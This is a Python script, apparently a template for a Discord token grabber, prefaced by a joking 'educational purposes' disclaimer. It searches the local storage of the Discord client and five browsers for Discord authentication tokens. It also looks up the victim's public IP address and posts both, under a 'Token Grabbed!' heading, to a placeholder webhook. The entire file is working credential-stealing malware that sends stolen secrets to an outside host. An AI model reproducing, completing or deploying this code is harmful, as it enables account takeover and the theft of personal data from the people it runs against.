# Disclaimer: This is only for entertainment and educational purposes.  
# I’m not responsible for what you do with it or any consequences.  
# Made by Vexi :3

# -*- coding: utf-8 -*-
import os
import re
import requests
import base64

webhook = "{placeholder_webhook}" # type: ignore

def get_ip():
    ipapi = "https://api.ipify.org?format=json"
    response = requests.get(ipapi)
    
    if response.status_code == 200:
        return response.json()['ip']
    else:
        return "Unknown"
    
def get_token():
    path = os.getenv("APPDATA") + r"\discord\Local Storage\leveldb"

    if not os.path.exists(path):
        return "Unknown"
    
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    token = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)

                    if token:
                        return f"{token[0]}"
    return "Unknown"

def get_token_edge():
    path = os.getenv("LOCALAPPDATA") + r"\Microsoft\Edge\User Data\Default\Local Storage\leveldb"

    if not os.path.exists(path):
        return "Unknown"
    
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    token = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)

                    if token:
                        return f"{token[0]}"
    return "Unknown"

def get_token_chrome():
    path = os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Local Storage\leveldb"

    if not os.path.exists(path):
        return "Unknown"
    
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    token = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)

                    if token:
                        return f"{token[0]}"
    return "Unknown"

def get_token_opera():
    path = os.getenv("APPDATA") + r"\Opera Software\Opera Stable\Default\Local Storage\leveldb"

    if not os.path.exists(path):
        return "Unknown"
    
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    token = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)

                    if token:
                        return f"{token[0]}"
    return "Unknown"

def get_token_operagx():
    path = os.getenv("APPDATA") + r"\Opera Software\Opera GX Stable\Default\Local Storage\leveldb"

    if not os.path.exists(path):
        return "Unknown"
    
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    token = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)

                    if token:
                        return f"{token[0]}"
    return "Unknown"

def get_token_brave():
    path = os.getenv("LOCALAPPDATA") + r"\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"

    if not os.path.exists(path):
        return "Unknown"
    
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    token = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)

                    if token:
                        return f"{token[0]}"
    return "Unknown"

tokens = [
    get_token(),
    get_token_edge(),
    get_token_chrome(),
    get_token_opera(),
    get_token_operagx(),
    get_token_brave()
]

def get_id(token):
    try:
        return base64.b64decode(token.split(".")[0] + "==").decode()
    except:
        return "Unknown"

data = {
    "content": "@everyone",
    "embeds": [
        {
            "title": "Token Grabbed!",
            "description": (
                f"**User ID(s)**: {', '.join(str(get_id(x)) for x in tokens)}\n"
            ),

            "fields": [
                {
                    "name": f"**{str(get_id(x))}**",
                    "value": f"-# ||{x}||",
                    "inline": False
                }
                for x in tokens
            ],
            "footer": {
                "text": f"Victim's IP: {get_ip()}\nIf 'Unknown' is returned it likely means the victim has not logged into discord."
            }
        }
    ]
}

r = requests.post(webhook, json=data)
